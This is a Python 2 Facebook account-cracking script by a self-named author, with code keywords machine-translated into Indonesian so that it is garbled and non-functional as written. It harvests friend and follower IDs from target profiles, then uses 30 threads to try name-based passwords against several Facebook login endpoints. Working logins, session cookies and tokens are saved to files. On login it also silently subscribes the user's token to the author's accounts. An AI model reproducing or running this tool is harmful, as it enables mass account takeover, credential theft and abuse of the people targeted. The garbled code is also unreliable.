# -*- pengkodean: utf-8
# Penulis oleh : RAKA ™︻®╤───────═◍➤
# Github : Bangsat-XD
#Facebook : Raka Andrian Tara
# Instagram : raka_andrian27
# Twitter : Bangsat_XD
# CATATAN ...!!!
# JANGAN DI UBAH LAGI ANJING SCRIPT UDAH ENAK ...
# Meskipun Mau di Ubah IZIN DULU YA CUK ???
impor os
mencoba:
	permintaan impor
kecuali ImportError:
	os.system("permintaan pemasangan pip2")

mencoba:
	impor bs4
kecuali ImportError:
	os.system("pip2 install bs4")

impor os, sys, re, waktu, permintaan, json, acak, kalender
dari multiprocessing.pool impor ThreadPool
dari bs4 impor BeautifulSoup sebagai parser
dari datetime impor datetime
dari tanggal impor datetime

lingkaran = 0
identitas = []
oke = []
cp = []

ct = datetime.now()
n = ct.bulan
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember" ]
mencoba:
    jika n < 0 atau n > 12:
        keluar()
    nTemp = n - 1
kecuali ValueError:
    keluar()

saat ini = datetime.now()
ta = sekarang.tahun
bu = sekarang.bulan
ha = hari ini.hari
op = bulan[nTemp]


def jalan(z):
	untuk e dalam z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		waktu.tidur(000.05)

tanggal_saya = tanggal.hari ini()
jam = calendar.day_name[tanggal_saya.weekday()]
tBilall = ("%s-%s-%s-%s"%(jam, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni" , "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

             
def logo():
	os.system("hapus")
	print("""\033[1;97m 
                  \033[1;91m───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄───
                  ───█▒▒░░░░░░░░░▒▒█───
                  ────█░░█░░░░░█░░█────
                  ─▄▄──█░░░▀█▀░░░█──▄▄─
                  █░░█─▀▄░░░░░░░▄▀─█░░█
                  \033[1;95m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
                  █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█
                  █░░║║║╠─║─║─║║║║║╠─░░█
                  █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█
                  █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█  
            ®┏━━━┓╋╋┏┓╋╋╋╋┏━━━┓╋╋╋╋╋╋╋╋╋╋┏┓
             ┃┏━┓┃╋╋┃┃╋╋╋╋┃┏━┓┃╋╋╋╋╋╋╋╋╋╋┃┃
             ┃┗━┛┣━━┫┃┏┳━━┫┃╋┃┣┓┏┳━━┳━┓┏━┛┣━━┓  
             \033[1;92m┃┏┓┏┫┏┓┃┗┛┫┏┓┃┗━┛┃┗┛┃┏┓┃┏┓┫┏┓┃┏┓┃
             ┃┃┃┗┫┏┓┃┏┓┫┏┓┃┏━┓┃┃┃┃┏┓┃┃┃┃┗┛┃┏┓┃
             \033[1;97m                                                        
    \033[1;95m──────═• \033[1;92m● \033[1;97m \033[41;1m[ RAKA .💚. AMANDA ]\033[00;1m \033[1;92m● \033[1;97m\033[1;95m•]
\033[1;97m-------------------------------------------- ------
\033[1;93m➤\033[1;97m Penulis : \033[1;92m☆ RAKA ™︻®╤───────═◍➤ \033[1;97m]
\033[1;93m➤\033[1;97m Github : \033[1;92mhttps://github.com/Bangsat-XD \033[1;97m
\033[1;93m➤\033[1;97m Facebook : \033[1;92mRaka Andrian Tara \033[1;97m
\033[1;93m➤\033[1;97m Instagram : \033[1;92mraka_andrian27 \033[1;97m
\033[1;93m➤\033[1;97m Twitter : \033[1;92mBangsat_XD \033[1;97m
\033[1;97m-------------------------------------------- ------""")
def masuk():
	os.system("hapus")
	mencoba:
		#-> uji koneksi
		request.get("https://mbasic.facebook.com")
	kecuali request.exceptions.ConnectionError:
		exit("Kesalahan Koneksi Internet")
	mencoba:
		token = buka("login.txt", "r")
		Tidak bisa()
	kecuali KeyError, IOError:
		token = raw_input("\033[1;93m➤\033[1;97m Masukkan Token : ")
		jika token == "":
			print("Masukan Salah")
		mencoba:
			nama = request.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
			buka("login.txt", "w").write(token)
			#-> bot ikuti
			request.post("https://graph.facebook.com/100000834003593/subscribers?access_token="+token) # Raka Andrian Tara
			request.post("https://graph.facebook.com/100017584682867/subscribers?access_token="+token) # RAKA THE KING
			request.post("https://graph.facebook.com/100000395779504/subscribers?access_token="+token) # MANTAN GARANGAN
			request.post("https://graph.facebook.com/532301703502197/subscribers?access_token="+token) # Pansfage
			Tidak bisa()
		kecuali KeyError:
			os.system("rm -f login.txt")
			exit("[?] Kesalahan Masuk")
	
menu def():
	os.system("hapus")
	token global
	mencoba:
		token = buka("login.txt","r").read()
	kecuali KeyError:
		os.system("rm -f login.txt")
		exit("[?] Kesalahan Masuk")
	mencoba:
		nama = request.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
	kecuali IOError:
		os.system("rm -f login.txt")
		exit("\033[1;96m[\033[1;93m+\033[1;96m] Kesalahan Token")
	kecuali request.exceptions.ConnectionError:
		exit(" ! tidak ada koneksi internet")
	logo()
	print("\033[1;97m[1]\033[1;92m─ ® \033[1;97m Klon dari teman umum")
	print("\033[1;97m[2]\033[1;92m─ ® \033[1;97m Crack dari pengikut publik")
	print("\033[1;97m[3]\033[1;92m─ ® ─\033[1;97m Multi cracking dari ID publik\033[1;97m [ \033[1;95mPro \033[1; 97m]")
	print("\033[1;97m[4]\033[1;92m─ ® \033[1;97m Periksa hasil retak")
	print("\033[1;97m[5]\033[1;92m─ ® ─\033[1;97m Pengaturan agen pengguna \033[1;97m [ \033[1;95mPro \033[1;97m] ]")
	print("\033[1;97m[6]\033[1;92m─ ® \033[1;97m Keluar\033[1;97m [ \033[1;91mRemove-Token \033[1;97m]] ")
	print("\033[1;97m----------------------------------------- ---------")
	
	Bilal = raw_input("\033[1;97m[+]\033[1;92m─ ® \033[1;97m Opsi : ")
	jika Bilal ="":
		Tidak bisa()
	elif Bilal == "1" atau Bilal == "01":
		publik()
		metode()
	elif Bilal == "2" atau Bilal == "02":
		pengikut()
		metode()
	elif Bilal == "3" atau Bilal == "03":
		massal()
		metode()
	elif Bilal == "4" atau Bilal == "04":
		cetak("")
		print("\033[1;97m[1]\033[1;92m─ ® \033[1;97m Periksa hasil RAKA_AMANDA OK")
		print("\033[1;97m[2]\033[1;92m─ ® \033[1;97m Periksa hasil RAKA_AMANDA CP")
		cetak("")
		cek = raw_input("\033[1;97m[+]\033[1;92m─ ® \033[1;97m Opsi : ")
		jika cek ="":
			Tidak bisa()
		elif cek == "1":
			dirs = os.listdir("Oke")
			print("\033[1;96m[\033[1;93m+\033[1;96m] Salin nama file dan lalu ke input")
			untuk file di dirs:
				print("[®] "+file)
			mencoba:
				file = raw_input("\n\033[1;96m[\033[1;93m+\033[1;96m] nama file : ")
				jika file == "":
					Tidak bisa()
				Totalok = buka("OK/%s"%(file)).read().splitlines()
			kecuali IOError:
				exit(" ! file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print("#---------------------------------------------- ")
			print("Hasil Retak : %s Total : %s\033[0;92m"%(del_txt, len(Totalok)))
			os.system("cat OK/%s"%(file))
			print(" \033[0;94m # --------------------------------------------------- ------")
			keluar(" ")
		elif cek == "2":
			dirs = os.listdir("CP")
			print("\033[1;96m[\033[1;93m+\033[1;96m] Salin Nama File Dan Lewat ke Input")
			untuk file di dirs:
				cetak("+"+file)
			mencoba:
				file = raw_input("\n\033[1;96m[\033[1;93m+\033[1;96m] Nama File : ")
				jika file == "":
					Tidak bisa()
				Totalcp = buka("CP/%s"%(file)).read().splitlines()
			kecuali IOError:
				exit(" ! file %s tidak tersedia"%(file))
			nm_file = ("%s"%(file)).replace("-", " ")
			del_txt = nm_file.replace(".txt", "")
			print("#---------------------------------------------- ")
			print("Hasil crack : %s total : %s\033[0;93m"%(del_txt, len(Totalcp)))
			os.system("cat CP/%s"%(file))
			print("\033[0;96m # --------------------------------------------------- ------")
			keluar(" ")
		Tidak bisa()

def publik():
	token global
	mencoba:
		token = buka("login.txt", "r").read()
	kecuali IOError:
		exit("\n\033[1;96m[\033[1;93m!\033[1;96m] Kesalahan Token")
	idt = raw_input("\033[1;93m➤\033[1;97m Target Id : ")
	mencoba:
		untuk saya di request.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["nama"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	kecuali KeyError:
		exit("\033[1;93m➤\033[1;97m Daftar teman akun tidak untuk umum")
	print("\033[1;93m➤\033[1;97m Jumlah Id : \033[0;91m%s\033[0;97m"%(len(id)))) 

def pengikut():
	token global
	mencoba:
		token = buka("login.txt", "r").read()
	kecuali IOError:
		exit("\n\033[1;96m[\033[1;94m+\033[1;96m] Kesalahan Token")
	idt = raw_input("\033[1;93m➤\033[1;97m Target Id : ")
	mencoba:
		untuk saya di request.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
			uid = i["id"]
			nama = i["nama"].rsplit(" ")[0]
			id.append(uid+"<=>"+nama)
	kecuali KeyError:
		exit("\033[1;93m➤\033[1;97m Daftar teman akun tidak untuk umum")
	print("\033[1;93m➤\033[1;97m Jumlah Id : \033[0;91m%s\033[0;97m"%(len(id)))) 

def massal():
	token global
	mencoba:
		token = buka("login.txt", "r").read()
	kecuali IOError:
		exit("\033[1;96m[\033[1;94m+\033[1;96m] Kesalahan Token")
	mencoba:
		tanya_Total = int(input("\033[1;93m➤\033[1;97m Masukkan Opsi Beberapa ID : "))
	kecuali:tanya_Total=1
	untuk t dalam rentang(tanya_Total):
		t +1
		idt = raw_input("\033[1;93m➤\033[1;97m Target ID %s : "%(t))
		mencoba:
			untuk saya di request.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				uid = i["id"]
				nama = n["nama"].rsplit(" ")[0]
				id.append(uid+"<=>"+nama)
		kecuali KeyError:
			print("\033[1;93m➤\033[1;97m Id daftar teman Tidak untuk umum")
	print("\033[1;93m➤\033[1;97m Jumlah id : \033[0;92m%s\033[0;96m"%(len(id))))

metode def():
	print("\033[1;93m➤\033[1;97m Pilih metode crack [ \033[1;92mRecommended B-API \033[1;97m]")
	print("\033[1;97m[1]\033[1;92m─ ® \033[1;97mB-API\033[1;97m [ \033[1;95mFast \033[1;97m]]" )
	print("\033[1;97m[2]\033[1;92m─ ® \033[1;97mM-basic\033[1;97m [ \033[1;95mFast \033[1;97m]" )
	print("\033[1;97m[3]\033[1;92m─ ® \033[1;97mFacebook gratis\033[1;97m [ \033[1;95mNormal \033[1;97m]")
	metode = raw_input("[+]\033[1;92m─ ® \033[1;97mPilihan : ")
	jika metode == "":
		Tidak bisa()
	metode elif == "1":
		ask = raw_input("\033[1;93m➤\033[1;97m Apakah Anda memilih sandi manual ? y/t\033[1;97m [ \033[1;92mDefault : t \033[1;97m]] : ")
		jika bertanya == "y":
			petunjuk()
		cetak("")
		ThreadPool(30).peta(bapi, id)
		exit("Program Berakhir")
	metode elif == "2":
		ask = raw_input("\033[1;93m➤\033[1;97m Apakah Anda memilih kata sandi manual y/t\033[1;97m [ \033[1;92mDefault : t \033[1;97m] ")
		jika bertanya == "y":
			petunjuk()
		cetak("")
		ThreadPool(30).peta(dasar, id)
		exit("Program Berakhir")
	metode elif == "3":
		ask = raw_input("\033[1;93m➤[\033[1;94m!\033[1;97m] Apakah Anda memilih kata sandi manual y/t\033[1;97m [ \033[1;92mDefault : t \033[1;97m] ")
		jika bertanya == "y":
			petunjuk()
		cetak("")
		ThreadPool(30).peta(ponsel, id)
		exit("Program Berakhir")
	lain:
		Tidak bisa()

def cek_ttl_cp(uid, pw):
	mencoba:
		token = buka("login.txt", "r").read()
		dengan request.Session() sebagai ses:
			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
			bulan, hari, tahun = ttl.split("/")
			bulan = bulan_ttl[bulan]
			print("\r\033[0;91m[RAKA_AMANDA] %s®%s®%s %s %s\033[0;91m"%(uid, pw, hari, bulan, tahun))
			cp.append("%s®%s"%(uid, pw))
			open("CP/%s.txt"%(tanggal),"a").write(" + %s®%s®%s %s %s\n"%(uid, pw, hari, bulan, tahun ))
	kecuali KeyError, IOError:
		hari = ("")
		bulan = ("")
		tahun = ("")
	kecuali: lulus

def bapi (pengguna):
	mencoba:
		ua = buka(".ua", "r").read()
	kecuali IOError:
                ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA; FBLC/id_ID;FBAV/239.0.0.10.109;]")
                ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/45904160;FBDM/{density=3.0,width= 1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86 :armeabi-v7a;]")
	lingkaran global, token
	sys.stdout.write(
		"\r\033[1;93m➤ \033[0;92mCRACK \033[0;93m••>\033[0;95m %s/%s ••> [Oke:-%s] \033[0 ;92m® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, nama = user.split("<=>")
	jika len(nama)>=6:
		pwx = [ nama, nama+"1", nama+"12", nama+"123" ]
	elif len(nama)<=2:
		pwx = [ nama+"3", nama+"1234", nama+"12345" ]
	elif len(nama)<=3:
		pwx = [ nama+"2", nama+"12", nama+"123" ]
	lain:
		pwx = [ nama+"123", nama+"1234", nama+"12345" ]
	mencoba:
		untuk pw di pwx:
			pw = pw.bawah()
			ses = permintaan.Sesi()
			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x- fb-net-hni": str(random.randint(20000, 40000), "x-fb-connection-quality": "SANGAT BAIK", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", " user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			kirim = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies = 1 & error_detail_type = button_with_disabled & source = device_based_login & meta_inf_fbmeta =% 20 & currently_logged_in_userid = 0 & method = GET & locale = en_US & client_country_code = US & fb_api_caller_class = com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler & access_token = 350.685.531.728 | 62f8ce9f74b12f84c123cc23437a4a32 & fb_api_req_friendly_name = mengotentikasi & cpl = true", header = headers_)
			jika "session_key" di send.text dan "EAA" di send.text:
				print("\r\033[0;92m[RAKA_AMANDA] %s®%s®%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s®%s"%(uid, pw))
				buka("OK/%s.txt"%(tBilall),"a").write(" + %s®%s\n"%(uid, pw))
				merusak
				melanjutkan
			elif "www.facebook.com" di send.json()["error_msg"]:
				print("\r\033[0;91m[RAKA_AMANDA] %s®%s\033[0;92m "%(uid, pw))
				cp.append("%s®%s"%(uid, pw))
				buka("CP/%s.txt"%(tBilall),"a").write(" + %s®%s\n"%(uid, pw))
				merusak
				melanjutkan

		lingkaran += 1
	kecuali:
		lulus

def mbasic (pengguna):
	mencoba:
		ua = buka(".ua", "r").read()
	kecuali IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA; FBLC/it_IT;FBAV/239.0.0.10.109;]")
		ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/45904160;FBDM/{density=3.0,width= 1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86 :armeabi-v7a;], Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN /EMA;FBLC/id_ID;FBAV/255.0.0.8.119;]")
	lingkaran global, token
	sys.stdout.write(
		"\r\033[1;93m➤ \033[0;92mCRACK \033[0;93m••>\033[0;95m %s/%s ••> [Oke:-%s] \033[0 ;92m® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, nama = user.split("<=>")
	jika len(nama)>=6:
		pwx = [ nama, nama+"123", nama+"1234", nama+"12345" ]
	elif len(nama)<=2:
		pwx = [ nama+"123", nama+"1234", nama+"12345" ]
	elif len(nama)<=3:
		pwx = [ nama+"123", nama+"12345" ]
	lain:
		pwx = [ nama+"123", nama+"12345" ]
	mencoba:
		untuk pw di pwx:
			kwargs = {}
			pw = pw.bawah()
			ses = permintaan.Sesi()
			ses.headers.update({"Origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en; q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/ *;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8 ", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts",,"li",,"nomor_coba",,"unrecognized_tries","login"]
			untuk saya di b("masukan"):
				mencoba:
					if i.get("name") di bl:kwargs.update({i.get("name"):i.get("value")})
					lain: lanjutkan
				kecuali: lulus
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": " ","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data = kwargs)
			jika "c_user" di ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (kunci, nilai) untuk kunci, nilai dalam ses.cookies.get_dict().items() ])
				print("\r\033[0;92m[RAKA_AMANDA] %s®%s®%s\033[0;95m"%(uid, pw, kuki))
				ok.append("%s®%s"%(uid, pw))
				buka("OK/%s.txt"%(tBilall),"a").write(" + %s®%s\n"%(uid, pw))
				merusak
				melanjutkan
			elif "checkpoint" di ses.cookies.get_dict().keys():
				print("\r\033[0;91m[RAKA_AMANDA] %s®%s\033[0;96m "%(uid, pw))
				cp.append("%s®%s"%(uid, pw))
				buka("CP/%s.txt"%(tBilall),"a").write(" + %s®%s\n"%(uid, pw))
				merusak
				melanjutkan

		lingkaran += 1
	kecuali:
		lulus

def seluler (pengguna):
	mencoba:
		ua = buka(".ua", "r").read()
	kecuali IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA; FBLC/it_IT;FBAV/239.0.0.10.109;]")
                ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/45904160;FBDM/{density=3.0,width= 1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86 :armeabi-v7a;]")
                ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA; FBLC/id_ID;FBAV/255.0.0.8.119;]")
	lingkaran global, token
	sys.stdout.write(
		"\r\033[1;93m➤ \033[0;92mCRACK \033[0;93m••>\033[0;95m %s/%s ••> [Oke:-%s] \033[0 ;92m® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	uid, nama = user.split("<=>")
	jika len(nama)>=6:
		pwx = [ nama, nama+"123", nama+"1234", nama+"12345" ]
	elif len(nama)<=2:
		pwx = [ nama+"123", nama+"1234", nama+"12345" ]
	elif len(nama)<=3:
		pwx = [ nama+"123", nama+"12345" ]
	lain:
		pwx = [ nama+"123", nama+"12345" ]
	mencoba:
		untuk pw di pwx:
			kwargs = {}
			pw = pw.bawah()
			ses = permintaan.Sesi()
			ses.headers.update({"Origin": "https://touch.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en; q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/ *;q=0.8", "user-agent": ua, "Host": "touch.facebook.com", "referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8 ", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get("https://touch.facebook.com/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts",,"li",,"nomor_coba",,"unrecognized_tries","login"]
			untuk saya di b("masukan"):
				mencoba:
					if i.get("name") di bl:kwargs.update({i.get("name"):i.get("value")})
					lain: lanjutkan
				kecuali: lulus
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": " ","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data = kwargs)
			jika "c_user" di ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (kunci, nilai) untuk kunci, nilai dalam ses.cookies.get_dict().items() ])
				print("\r\033[0;92m[RAKA_AMANDA] %s®%s®%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s®%s"%(uid, pw))
				buka("OK/%s.txt"%(tBilall),"a").write(" + %s®%s\n"%(uid, pw))
				merusak
				melanjutkan
			elif "checkpoint" di ses.cookies.get_dict().keys():
				print("\r\033[0;91m[RAKA_AMANDA] %s®%s\033[0;91m "%(uid, pw))
				cp.append("%s®%s"%(uid, pw))
				buka("CP/%s.txt"%(tBilall),"a").write(" + %s®%s\n"%(uid, pw))
				merusak
				melanjutkan

		lingkaran += 1
	kecuali:
		lulus

def manual():
	mencoba:
		ua = buka(".ua", "r").read()
	kecuali IOError:
		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA; FBLC/it_IT;FBAV/239.0.0.10.109;]")
                ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/45904160;FBDM/{density=3.0,width= 1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86 :armeabi-v7a;]")
                ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA; FBLC/id_ID;FBAV/255.0.0.8.119;]")
	lingkaran global, token
	print("\n[+] Ketik , Untuk Kata Sandi ke-2 Misalnya : 112233,334455,445566,223344 dll")
	asu = raw_input("[+] Masukkan Password : ").split(",")
	jika len(asu) ="":
		exit("[?] Masukan Salah")
	print("[+] Masukkan 2-4 Kata Sandi Untuk Kecepatan Retak Cepat\n")

	def utama (pengguna):
		lingkaran global, token
		sys.stdout.write(
		        "\r\033[1;93m➤ \033[0;92mCRACK \033[0;93m••>\033[0;95m %s/%s ••> [Oke:-%s] \033[0 ;92m® \033[0;95m[CP:-%s] "%(loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid, nama = user.split("<=>")
		mencoba:
			untuk pw di asu:
				kwargs = {}
				pw = pw.bawah()
				ses = permintaan.Sesi()
				ses.headers.update({"Origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en; q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/ *;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8 ", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
				p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
				b = parser(p,"html.parser")
				bl = ["lsd","jazoest","m_ts",,"li",,"nomor_coba",,"unrecognized_tries","login"]
				untuk saya di b("masukan"):
					mencoba:
						if i.get("name") di bl:kwargs.update({i.get("name"):i.get("value")})
						lain: lanjutkan
					kecuali: lulus
				kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": " ","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data = kwargs)
				jika "c_user" di ses.cookies.get_dict().keys():
					kuki = (";").join([ "%s=%s" % (kunci, nilai) untuk kunci, nilai dalam ses.cookies.get_dict().items() ])
					print("\r\033[0;92m[RAKA_AMANDA] %s®%s®%s\033[0;97m"%(uid, pw, kuki))
					ok.append("%s®%s"%(uid, pw))
					buka("OK/%s.txt"%(tBilall),"a").write(" + %s®%s\n"%(uid, pw))
					merusak
					melanjutkan
				elif "checkpoint" di ses.cookies.get_dict().keys():
					print("\r\033[0;91m[RAKA_AMANDA] %s®%s\033[0;91m "%(uid, pw))
					cp.append("%s®%s"%(uid, pw))
					buka("CP/%s.txt"%(tBilall),"a").write(" + %s®%s\n"%(uid, pw))
					merusak
					melanjutkan

			lingkaran += 1
		kecuali:
			lulus
	p = ThreadPool(30)
	p.map(utama, id)
	exit("\n\n # [>Program Tutup<]")

def pengaturan_ua():
	print("[1] Ubah Agen-Pengguna")
	print("[2] Agen-Pengguna Default")
	ua = raw_input("\n [?] Pilih : ")
	jika kamu ="":
		Tidak bisa()
	elif ua == "1":
		c_ua = raw_input(" [+] Masukkan User-Agent : ")
		buka(".ua", "w").write(c_ua)
		waktu.tidur(1)
		raw_input("\n [!] Tekan Enter Untuk Menyimpan Agen-Pengguna")
		Tidak bisa()
	elif ua == "2":
		print("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC /it_IT;FBAV/239.0.0.10.109;]")
		os.system("rm -f .ua")
		waktu.tidur(1)
		raw_input("\n[®] Agen Pengguna Berhasil Menyimpan")
		Tidak bisa()

def raka_andrian():
	coba:os.mkdir("CP")
	kecuali: lulus
	coba:os.mkdir("Oke")
	kecuali: lulus

jika __name__ == "__main__":
	os.system("git tarik")
	os.system("sentuh login.txt")
	raka_andrian()
	Gabung()
